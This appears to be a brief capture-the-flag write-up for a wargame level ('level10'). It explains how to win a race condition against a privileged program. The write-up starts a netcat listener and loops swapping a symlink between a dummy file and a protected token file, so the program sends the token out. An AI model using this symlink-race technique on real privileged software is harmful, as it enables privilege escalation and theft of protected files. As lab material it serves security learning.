as the executable explains try to send a file to a server on port 6969

create a server on that port with a local ip using nc
nc -l 127.0.2.1 6969

now as it doesnt let you send token, a good workaround is create a background process that sends a dummy file b and once is running create a loop that change all time b file between dummy file and token softlink,
like this is very probable the executable takes b as a dummy file and sends just when it has change to be a simlink >:D

touch dummy1
(while 1; do ln -s ./dummy1 b; ln -s ./token b; done) &
level10 b (execute this very fast, or in a loop)
